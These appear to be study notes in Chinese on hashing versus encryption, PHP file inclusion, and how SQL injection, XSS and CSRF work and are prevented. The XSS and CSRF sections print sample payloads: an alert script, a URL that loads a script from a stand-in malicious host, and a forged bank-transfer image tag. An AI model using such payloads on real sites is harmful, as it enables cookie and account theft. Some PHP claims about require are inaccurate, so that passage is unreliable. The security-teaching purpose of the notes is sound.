## 請說明雜湊跟加密的差別在哪裡，為什麼密碼要雜湊過後才存入資料庫

> 講到雜湊跟加密，就順便連編碼一起講。演進史大概是：編碼 -> 加密 -> 雜湊。

* 編碼 (Encoding)：不會修改資料，也沒有加密效果，乍看之下很難懂，但只要知道轉換規則就可以破譯，實際上就是換個方式來表達資料。例如：摩斯密碼，是利用點 (短聲) 跟劃 (長聲) 所編碼。

* 加密 (Encrypt)：跟編碼有點像，但多了一個「金鑰」 (Key) ，加密跟解密要有金鑰才能進行，。例如：凱薩加密，以英文字母的偏移進行加密，而偏移量就是金鑰，金鑰是加密者自行決定的。

* 雜湊 (Hash)：把明碼的各個字元套用某個公式計算，過程可能會做各種加減乘除，最後算出一個值或字串，這個計算公式稱為「雜湊函數」(Hash function)。雜湊具有不可逆和多對一的特點。

=> 若是密碼存的明碼，一旦伺服器被駭客入侵，就會直接被偷走密碼了，因此要對密碼進行雜湊，轉換成另一種樣子。而之所以使用雜湊，原因是對比加密或編碼而言，雜湊有一個特點，就是無法逆推原明碼。當然現在有所謂的彩虹表，所以雜湊也不見得是安全的，更進一步的方法就是再多加一道步驟，雜湊 + 加鹽，而這又更複雜了。


---


## `include`、`require`、`include_once`、`require_once` 的差別

`include`、`require`、`include_once`、`require_once` 都是屬於可以直接引用外部檔案的函式。

`include` ：將指定的文件讀入並且執行裡面的程序。
`require` ：將指定的文件讀入，並把自己本身代換成這些讀入的內容，也就是說引入的文件內容為主程式的一部份。
`include_once` ：和 `include` 類似，區別是 PHP 會檢查該文件是否已經被讀入過，如果是則不會再次讀入，只會讀入一次 `once`。
`require_once` ：和 `require` 類似，區別是 PHP 會檢查該文件是否已經被讀入過，如果是則不會再次讀入，只會讀入一次 `once`。

=> 是不是 once：可以防止重複引入檔案時，造成多次重覆讀取而使得常數或自訂函數被重複定義的情形。
=> once 因為會多一個先判斷此文件存不存在，所以以效率而言較低。

`include` 和 `require` 的區別：
1. 若讀入的文件有錯誤，`include` 會產生警告訊息但是腳本會繼續執行； `require` 也會產生警告訊息但會直接停止腳本執行。
2. `include()` 是有條件包含函數； `require()` 是無條件包含函數。如以下舉例的程式碼：
```
if($something){ 
	include("somefile1");
	require("somefile2"); }

```
若 $something === false，`include("somefile1")` 便不會執行，但 `require("somefile2")` 仍會執行。


---


## 請說明 SQL Injection 的攻擊原理以及防範方法

原理：跟資料庫相關的一種攻擊方法，藉由 input 特殊形態的內容，使得電腦在理解上讓 input 變成後端程式碼的一部份，來改變整條程式碼的原意。

防範方法 -- 意識前提「不要輕易相信使用者輸入的資料」。
1. 對於 input 的資料進行驗證，例如檢查資料長度、檢查資料格式、限制輸入的某些字元 ......。
2. 使用 Regular expression ( 使用單個字串來描述一系列符合某個句法規則的字串 ) 來過濾輸入值，對於可能造成惡意程式碼的特殊字符進行轉譯處理或編碼轉換。
3. 使用參數化查詢而非動態組合查詢，也就是老師教的程式碼方法，目前被視為最有效可預防 SQL Injection 的防禦方式。
4. 使用不容易被猜到的資料表名稱和欄位名稱。
5. 設定合適的錯誤處理，可避免洩漏過多的資訊。
6. 進行權限處理，限制某些管道的使用者無法作資料庫存取。


---


##  請說明 XSS 的攻擊原理以及防範方法

原理：cross site scripting ，和 SQL Injection 有異曲同工之妙，也是讓輸入變成程式碼的一部份，攻擊者主要是利用某些特殊語法，規避掉字元的規則，藉此輸入 JS 的 script tag 的惡意指令代碼到網頁，在不知情的情況下，使用者可能就會載入並執行攻擊者惡意製造的網頁程式。

XSS攻擊的常見目的有 -- 
1. 盜用 cookie ，藉以取得使用者資訊。
2. 利用 iframe、frame、XMLHttpRequest 或 植入 Flash 等方式，冒充使用者身分執行一些動作。
3. 在瀏覽量大的網站放置 XSS ，達到 DOS 攻擊的效果。......

XSS 可分成三種常見的類型 -- Stored、Reflected、DOM Based。
1. Stored XSS，儲存型。顧名思義就是將 JavaScript 程式碼儲存在後端資料庫裡。若使用者輸入 `<script> alert('This is an attack!')</script>`，如果應用沒有做好字串的解析與特殊字元的防範，當這段 script 從資料庫被抓出來顯示，瀏覽器就會解讀成為一串 JS 的程式碼。
2. Reflected XSS，反射型。攻擊方式為將 script 藏在 URL 中，透過 GET 參數傳遞。如 `http://localhost:8080/reflected-xss-demos/?username='><script src='http://malicious-site.com/malicious.js'></script><a href='`， malicious.js 可能是盜取帳號密碼、盜取 cookie 等惡意操作。而為了不讓 URL 這麼一目瞭然的可疑，通常會經過 URL encoding 或是短網址來潤飾。攻擊者通常會透過將 URL 放到留言板或是廣告信件來誘導使用者點擊。
3. DOM Based XSS，或是 Type-0 XSS。網頁上的 JavaScript 在執行過程中，沒有詳細檢查資料使得操作 DOM 的過程代入了惡意指令。和前兩者最主要的差異為，Stored 和 Reflected 的攻擊，屬於 server side ( 服務端 )的安全漏洞；而 DOM Based XSS 取出和執行惡意代碼由 client side ( 瀏覽器端 ) 完成，屬於前端 JavaScript 自身的安全漏洞，因此前兩者需要在 server side 防範，DOM Based 則需要在 client side 防範。DOM Based XSS 因為惡意程式碼也是由 client side 輸入的，攻擊者不可能到使用者的電腦前親自輸入，因此 DOM Based XSS 通常需要搭配前兩種攻擊。

防範方法 --
Stored、Reflected：由後端進行防範。
1. 輸入時的防範，過濾特殊字元，除了 JavaScript 以外，URL 、 HTML 、 CSS 、 XML 也能作手腳。但一般而言，存在資料庫的還是希望會是原始內容，因此會在輸出的時候做防範。但輸入作防範也可多一層防禦。
2. 輸出時的防範，例如 -- PHP 的 htmlentities() 或 htmlspecialchars() 、 Python 的 cgi.escape() 。
DOM-Based：由前端來防範，但基本上還是跟後端防範的原則相同。
1. 強行指定輸出內容的格式，可指定輸出內容為文字或 html 或 JavaScript。例如若一個網頁藉由 JS 動態插入的內容只是要純文字，那麼與其使用 `document.getElementById('show_something').innerHTML = $something`，不如使用`document.getElementById('show_something').innerText = $something`，這樣一來，使用 `innerText` 會被保證為純文字，就不可能被插入惡意代碼了。

=> 總之就是注意一切的輸入跟輸出啦 www


---


## 請說明 CSRF 的攻擊原理以及防範方法

原理：Cross Site Request Forgery，或稱 one-click attack 。不同於 XSS 利用的是使用者對網站的信任，CSRF 利用的是網站對使用者「瀏覽器」的信任，也就是利用瀏覽器的 cookie 機制來製造攻擊機會。攻擊者不能透過 CSRF 攻擊獲取被攻擊者的帳戶，也不能竊取使用者的個人資訊，但卻可以欺騙瀏覽器，讓瀏覽器以為某些行為是使用者本人的操作行為。
例如：某家網銀轉帳的跳轉 URL 長這樣 https://kylemobank.com/withdraw?account=you&amount=1000&for=harry；同一時刻，你無意中點開了攻擊者的惡意網頁，其中有一個代碼長這樣 <img src="https://bank.example.com/withdraw?account=you&amount=1000000&for=badguy" />，而你的 cookie 又剛好還沒過期，於是在不知情的情況下就轉帳了一百萬給壞人了 !!! ( 當然這是很單純的舉例而已，但就能知道 SCRF 有多可怕 ! )

防範方法 --
使用者方面：但主要還是應該由 server side 防範。
1. 每次使用完網站就登出，不要讓 cookie 存著。
2. 關閉執行 JavaScript，或過濾掉某些程式碼不要執行，例如 `<form>` 、 `<img>` 、 `<script>` 、 `<iframe>` ...... 常被惡意使用的程式碼。 => 不過這應該比較難啦，會不方便。

server side：
1. 檢查 request header 裡面的 referer 欄位，看看是不是合法的 domain 發來的 request。此方法注意點有三，第一、有些瀏覽器不會帶 referer；第二、使用者可能會關掉自動帶 referer 的功能；第三、檢查 referer 的程式碼是否可行。
2. 加上圖形驗證、簡訊驗證機制。
3. 加上 CSRF token：在 form 裡面加上一個 hidden 的欄位，值由 server 隨機產生，並且存在 server 的 session 中。
4. Double Submit Cookie：此解法和 CSRF token 雷同，不同於，不把這個值寫在 server session ，而是讓 client side 同時設定一個名叫 token 的 cookie，值也是同一組。原理在於，CSRF request 來自於不同 domain，真正使用者的 request 是同一個 domain，因此只要能分辨 domain 是否相同便可以。此方法也有缺點，攻擊者或許可以透過子域建立同 domain 的 cookie，又或是中間攻擊這個 request( 我不清楚怎麼攻擊 ... )。
5. SameSite Cookie：屬於瀏覽器本身的防禦，Google 在 Chrome 51 版推出此功能。在原本設置 Cookie 的 header 後加上 `SameSite` 就行，有兩種模式，一種加上 `SameSite=Strict`，只要瀏覽器驗證不是在同一個 site 底下發出的 request，都不會帶上 cookie；另一種加上 `SameSite=Lax`，保有部分彈性，GET method 的 request 還是會帶上 cookie，但是 POST、DELETE、PUT method 便不會帶上。

